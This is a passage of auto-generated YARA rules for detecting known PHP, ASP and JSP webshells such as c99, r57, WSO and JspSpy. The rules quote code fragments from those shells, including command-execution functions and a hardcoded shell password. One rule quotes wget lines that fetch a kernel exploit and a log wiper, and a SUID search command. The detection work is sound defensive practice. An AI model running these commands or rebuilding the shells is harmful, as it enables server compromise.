      $s2 = "#000000; FONT-FAMILY: verdana; SCROLLBAR-DARKSHADOW-COLOR: #000000}\"" fullword ascii
      $s3 = "rrs\"body,td{font-size: 12px;background-color:#000000;color:#00ff00;SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #0" ascii
      $s4 = "rrs\"input,select,textarea{BORDER-TOP-WIDTH: 1px; FONT-WEIGHT: bold; BORDER-LEFT-WIDTH: 1px; FONT-SIZE: 12px; BORDER-LEFT-COLOR:" ascii
      $s5 = "rrs\"BODY{color:#00ff00}\"" fullword ascii
      $s6 = "8000; SCROLLBAR-SHADOW-COLOR: #008000; SCROLLBAR-3DLIGHT-COLOR: #000000; SCROLLBAR-ARROW-COLOR: #000000; SCROLLBAR-TRACK-COLOR: " ascii
      $s7 = "#008000; BACKGROUND: #004000; BORDER-BOTTOM-WIDTH: 1px; BORDER-BOTTOM-COLOR: #008000; COLOR: #00ff00; BORDER-TOP-COLOR: #008000;" ascii
      $s8 = "bottomad=\"Oh my God, what is safe?\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _devshell_devilzShell_396 {
   meta:
      description = "webshell - from files devshell.asp, devilzShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f8751474732f13b4139d18f33929a7fa88ca7b255455b2fb814fbc1d61ad8a6a"
      hash2 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
   strings:
      $s1 = "shell_password = \"devilzc0der\"" fullword ascii
      $s2 = "shell_fake_name = \"Server Logging System\"" fullword ascii
      $s3 = "shell_name = \"devilzShell\"" fullword ascii
      $s4 = "'# devilzShell <[asp]>" fullword ascii
      $s5 = "shell_title = \" :: \" & shell_name & \" ::\"" fullword ascii
      $s6 = "shell_fav_port = \"12345\"" fullword ascii
      $s7 = "shell_version = \"v1\"" fullword ascii
      $s8 = "shell_color = \"#374374\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _bypass403_wso_ng_397 {
   meta:
      description = "webshell - from files bypass403.php, wso-ng.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0f4ac0a10f5b4ee27fec5e85928fd45ef76d48b24bc6d822a5f68cdbe5c433b3"
      hash2 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
   strings:
      $s1 = "elseif (($p & 0x8000) == 0x8000) $i = '-';" fullword ascii
      $s2 = "elseif (($p & 0x2000) == 0x2000) $i = 'c';" fullword ascii
      $s3 = "elseif (($p & 0x1000) == 0x1000) $i = 'p';" fullword ascii
      $s4 = "elseif (($p & 0x6000) == 0x6000) $i = 'b';" fullword ascii
      $s5 = "elseif (($p & 0x4000) == 0x4000) $i = 'd';" fullword ascii
      $s6 = "elseif (($p & 0xA000) == 0xA000) $i = 'l';" fullword ascii
      $s7 = "if (($p & 0xC000) == 0xC000) $i = 's';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _nstview_Ani_Shell_newsh_qyt0dHv1_v4xGus6X_aioshell_NIX_REMOTE_WEB_SHELL_398 {
   meta:
      description = "webshell - from files nstview.php, Ani-Shell.php, newsh.php, qyt0dHv1.php, v4xGus6X.php, aioshell.php, NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a111977d2403dd241ef2fabe841b96535f05d004a276e12ad29462b565b8aaa8"
      hash2 = "9476a89065f61d65f093098e59444d605012872ade480bd02235cc545618231c"
      hash3 = "60a4730f359762d973d9cfc00093cdbddaa2ce4ca4c4e113a57c73e44353d93c"
      hash4 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash5 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash6 = "9211e746ea45d8531d92fa01889b750187deeb41d5400dbd572b6474a1342803"
      hash7 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "} elseif (($perms & 0x8000) == 0x8000) {" fullword ascii
      $s2 = "if (($perms & 0xC000) == 0xC000) {" fullword ascii
      $s3 = "} elseif (($perms & 0x1000) == 0x1000) {" fullword ascii
      $s4 = "} elseif (($perms & 0xA000) == 0xA000) {" fullword ascii
      $s5 = "} elseif (($perms & 0x4000) == 0x4000) {" fullword ascii
      $s6 = "} elseif (($perms & 0x6000) == 0x6000) {" fullword ascii
      $s7 = "} elseif (($perms & 0x2000) == 0x2000) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_r57_Mohajer22_r57_kartal_ctt_sh_r57_r57_iFX_399 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, r57_Mohajer22.php, r57_kartal.php, ctt_sh.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash5 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
      hash6 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash7 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "margin-left: 1px;" fullword ascii /* Goodware String - occured 1 times */
      $s2 = " return $ret;" fullword ascii
      $s3 = "font: 7pt Verdana;" fullword ascii
      $s4 = "margin-bottom: 1px;" fullword ascii
      $s5 = "margin-top: 1px;" fullword ascii /* Goodware String - occured 1 times */
      $s6 = "margin-right: 1px;" fullword ascii /* Goodware String - occured 1 times */
      $s7 = "if($ora_on){echo \"<font color=green>ON</font></b>\";}else{echo \"<font color=red>OFF</font></b>\";}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57_Mohajer22_r57_kartal_r57_400 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57_Mohajer22.php, r57_kartal.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "'eng_text1' =>'Executed command'," fullword ascii
      $s2 = "'eng_text2' =>'Execute command on server'," fullword ascii
      $s3 = "'eng_butt1' =>'Execute'," fullword ascii
      $s4 = "'eng_text3' =>'Run command'," fullword ascii
      $s5 = "'eng_text11'=>'Password for access'," fullword ascii
      $s6 = "'eng_text5' =>'Upload files on server'," fullword ascii
      $s7 = "'eng_text4' =>'Work directory'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( all of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_r57_401 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "asename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s2 = "   if($_POST['cmd']==\"ftp_file_down\") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.(($windows)?('\\\\'):('/'" ascii
      $s3 = "if(substr($string,0,1)!='#') array_push($users,$user[0]);" fullword ascii
      $s4 = "   if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s5 = "$user = @explode(\":\",$string);" fullword ascii
      $s6 = "$filename .= '.zip';" fullword ascii
      $s7 = "$mime_type = 'application/octet-stream';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _angel_shell_2008_phpspy_2006_2009lite_spy_lnc_2011_2013_2009mssql_402 {
   meta:
      description = "webshell - from files angel.php, shell.php, 2008.php, phpspy_2006.php, 2009lite.php, spy.php, lnc.php, 2011.php, 2013.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash3 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash4 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash5 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash6 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash7 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash8 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash9 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash10 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "PHPINFO" fullword ascii
      $s2 = "$file_i = '0';" fullword ascii
      $s3 = "function makeselect($arg = array()){" fullword ascii
      $s4 = "}//end newtime" fullword ascii
      $s5 = "} elseif ($a == 1) {" fullword ascii
      $s6 = "$dir_i = '0';" fullword ascii
      $s7 = "if ($a==0) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_wso_4_1_3_wso_4_2_2_403 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, wso-4.1.3.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash8 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);return" ascii
      $s2 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.chmod.value);return" ascii
      $s3 = "e;\"><input type=text name=touch value=\"'.date(\"Y-m-d H:i:s\", @filemtime($_POST['p1'])).'\"><input type=submit value=\">>\"><" ascii
      $s4 = "=name value=\"'.htmlspecialchars($_POST['p1']).'\"><input type=submit value=\">>\"></form>';" fullword ascii
      $s5 = "e;\"><input type=text name=chmod value=\"'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'\"><input type=submit value=\">>\"" ascii
      $s6 = "echo '<form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.name.value);return false;\"><input type=text " ascii
      $s7 = "</tr></table></div></body></html>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _qyt0dHv1_1n73ction_wso_404_404 {
   meta:
      description = "webshell - from files qyt0dHv1.php, 1n73ction.php, wso_404.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "9507cfcb16c1a7f91c2ec0b93393615e85fb7834c10c58c2f351f0c69bdee285"
      hash2 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash3 = "fd3db2020e82517d8fbfcc8dd3399efbdf82057353b94509995bba128030d193"
   strings:
      $s1 = "@ini_set('log_errors',0); " fullword ascii
      $s2 = "@ini_set('error_log',NULL); " fullword ascii
      $s3 = "        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; " fullword ascii
      $s4 = "@session_start(); " fullword ascii
      $s5 = "    <form method=post> " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( all of them )
      ) or ( all of them )
}

rule _c99_PSych0_Shell__ci___Biz_was_here_c99_locus7s_405 {
   meta:
      description = "webshell - from files c99_PSych0.php, Shell [ci] .Biz was here.php, c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $s1 = "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget ins" ascii
      $s2 = "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (I" ascii
      $s3 = "$chemin=$_GET['directory'];" fullword ascii
      $s4 = "<tr><td height=\"1\" valign=\"top\" colspan=\"2\"><p align=\"center\"><b>:: <a href=\"<?php echo $surl; ?>act=cmd&d=<?php echo u" ascii
      $s5 = "if(isset($_GET['directory']))" fullword ascii
      $s6 = "                  <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">S" ascii
      $s7 = "echo \"Trying To List Folder <font color=#000099><b>$chemin</b></font><br>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c66_c99v2_c99shell_c99_w4cking_Shell__ci___Biz_was_here_c99_locus7s_c99_406 {
   meta:
      description = "webshell - from files c66.php, c99v2.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash7 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "function myshellexec($cmd)" fullword ascii
      $s2 = "  elseif (is_resource($fp = popen($cmd,\"r\")))" fullword ascii
      $s3 = " if (!empty($cmd))" fullword ascii
      $s4 = " $result = \"\";" fullword ascii
      $s5 = "   while(!feof($fp)) {$result .= fread($fp,1024);}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

rule _c66_c99shell_c99_w4cking_Shell__ci___Biz_was_here_smowu_c99_407 {
   meta:
      description = "webshell - from files c66.php, c99shell.php, c99_w4cking.php, Shell [ci] .Biz was here.php, smowu.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "65f4630106eaf6604952c79f8a6406c7c18de5f95eb222bb4b1851e2e6f9bd32"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "  <script>" fullword ascii
      $s2 = "    document.getElementById('actbox'+id).checked = status;" fullword ascii
      $s3 = "    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;" fullword ascii
      $s4 = "  function ls_setcheckboxall(status)" fullword ascii
      $s5 = "  function ls_reverse_all()" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x683c ) and filesize < 500KB and ( all of them )
      ) or ( all of them )
}

rule _icesword_job_ma4_ha_JspWebshell_1_2_2_520_ma1_408 {
   meta:
      description = "webshell - from files icesword.jsp, job.jsp, ma4.jsp, ha.jsp, JspWebshell 1.2.jsp, 2.jsp, 520.jsp, ma1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
      hash2 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
      hash3 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
      hash4 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
      hash5 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
      hash6 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
      hash7 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
      hash8 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
   strings:
      $s1 = "public boolean validate(String password) {" fullword ascii
      $s2 = "td.datarows {" fullword ascii
      $s3 = "input.textbox {" fullword ascii
      $s4 = "public boolean fileCopy(String srcPath, String dstPath) {" fullword ascii
      $s5 = "public String HTMLEncode(String str) {" fullword ascii
      $s6 = "border: black solid 1;" fullword ascii
      $s7 = "input.button {" fullword ascii /* Goodware String - occured 1 times */
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_a_JspSpyJDK5_JspSpyJDK51_u_000_css_807_jspspy_k8_jspspy_ma3_spyjsp_409 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, a.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash11 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash12 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash13 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash14 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash15 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash16 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash17 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash18 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash19 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash20 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash21 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash22 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash23 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash24 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash25 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash26 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash27 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "while ((a = sis.readLine(b,0,b.length))!= -1) {" fullword ascii
      $s2 = "JSession.setAttribute(\"done\",\"d\");" fullword ascii
      $s3 = "BufferedInputStream in = new BufferedInputStream(conn.getInputStream());" fullword ascii
      $s4 = "ZipEntry entry = new ZipEntry(base+f.getName());" fullword ascii
      $s5 = "if ((k = s.indexOf(\"filename=\\\"\"))!= -1) {" fullword ascii
      $s6 = "out.write(data,0,len);" fullword ascii
      $s7 = "while ((a = sis.readLine(b,0,b.length))!=-1) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( all of them )
      ) or ( all of them )
}

rule _in_Browser_download_warn_ma_jfolder01_jsp_File_browser_3_JFolder_shell1_webshell_nc_jsp_400_410 {
   meta:
      description = "webshell - from files in.jsp, Browser.jsp, download.jsp, warn.jsp, ma.jsp, jfolder01.jsp, jsp_File_browser.jsp, 3.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, 400.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash2 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash3 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash4 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash5 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash6 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash7 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash8 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
      hash9 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash10 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash11 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash12 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash13 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
   strings:
      $s1 = "public long totalSize;" fullword ascii
      $s2 = "public long starttime;" fullword ascii
      $s3 = "public long currSize;" fullword ascii
      $s4 = "public boolean aborted;" fullword ascii
      $s5 = "public UplInfo() {" fullword ascii
      $s6 = "totalSize = 0l;" fullword ascii
      $s7 = "currSize = 0;" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 200KB and ( all of them )
      ) or ( all of them )
}

rule _wsproxy_wscmd_411 {
   meta:
      description = "webshell - from files wsproxy.jsp, wscmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "01fb2195996b654410d45165d7c47a0bf437b102e4408205c93eb9c5c4baec3e"
      hash2 = "677db2639e3b72d3f906336276e66df8bd6e249e95b4076165a2a813a70057be"
   strings:
      $s1 = "        out.println(\"success, connect url path: \" + servletContext.getContextPath() + path);" fullword ascii
      $s2 = "    ServletContext servletContext = request.getSession().getServletContext();" fullword ascii
      $s3 = "        if (servletContext.getAttribute(path) == null){" fullword ascii
      $s4 = "            container.addEndpoint(configEndpoint);" fullword ascii
      $s5 = "    ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( all of them )
      ) or ( all of them )
}

rule _hsxa1_hsxa_412 {
   meta:
      description = "webshell - from files hsxa1.jsp, hsxa.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "68382b7569ad669bf98a8ee26ecb95c098b5a7692994fef5c9d22b77ed68b069"
      hash2 = "d77f3332083ca55d0cc730c39970b6413430e986c6adae9ece72cceb640da27b"
   strings:
      $s1 = "utStream\"/><jsp:directive.page import=\"java.io.FileOutputStream\"/><% int i=0;String method=request.getParameter(\"act\");if(m" ascii
      $s2 = "!=null&&method.equals(\"yoco\")){String url=request.getParameter(\"url\");String text=request.getParameter(\"smart\");File f=new" ascii
      $s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"java.io.File\"/><jsp:directive.page import=\"java." ascii
      $s4 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"java.io.File\"/><jsp:directive.page import=\"java." ascii
      $s5 = "url);if(f.exists()){f.delete();}try{OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();}catch(Exception e" ascii
      $s6 = "){i++;%>0<%}}if(i==0){%>1<%}%><form action='?act=yoco' method='post'><input size=\"100\" value=\"<%=application.getRealPath(\"/" ascii
      $s7 = "\" name=\"url\"><br><textarea rows=\"20\" cols=\"80\" name=\"smart\">" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 2KB and ( all of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_2014_UnKnown_Vip__1__asp__1__UnKnown__413 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, 2014.asp, UnKnown Vip (1).asp, asp (1).asp, UnKnown Vip.asp, .asp, 2013.asp, .asp, vps.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
